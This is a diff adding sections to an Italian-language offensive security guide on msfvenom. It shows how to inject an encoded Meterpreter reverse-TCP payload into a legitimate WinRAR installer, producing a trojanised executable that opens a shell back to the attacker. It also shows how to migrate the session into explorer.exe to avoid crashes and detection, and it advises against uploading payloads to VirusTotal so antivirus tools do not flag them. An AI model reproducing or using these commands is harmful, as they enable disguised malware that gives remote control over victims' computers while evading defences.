@@ -122,8 +122,29 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shika
 
 > Si consiglia di **non caricare i payload su VirusTotal** o simili, poiché questi strumenti contribuiscono ad aggiornare i database degli antivirus, rendendo il tuo payload riconoscibile.
 
-### Cos’è il Shellcode?
+---
 
+## Iniezione in File Legittimi
 
+Puoi mascherare il payload dentro un programma reale (es. WinRAR):
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 10 -f exe -x /path/to/winrar_setup.exe > /tmp/winrar_modificato.exe
+```
+
+- `-x` → file legittimo in cui iniettare
+- `-k` → mantiene il comportamento originale del file
+
+> `-k` funziona solo in alcuni casi e non è sempre affidabile: dipende da come il programma legittimo è strutturato.
+
+---
+
+## Post-Exploitation: Migrate
+
+Dopo aver stabilito una sessione `meterpreter`, è consigliabile usare:
+```bash
+run post/windows/manage/migrate
+```
+
+Questo modulo migra il processo in uno stabile (es. `explorer.exe`), evitando crash e rilevamento.
 
 ---
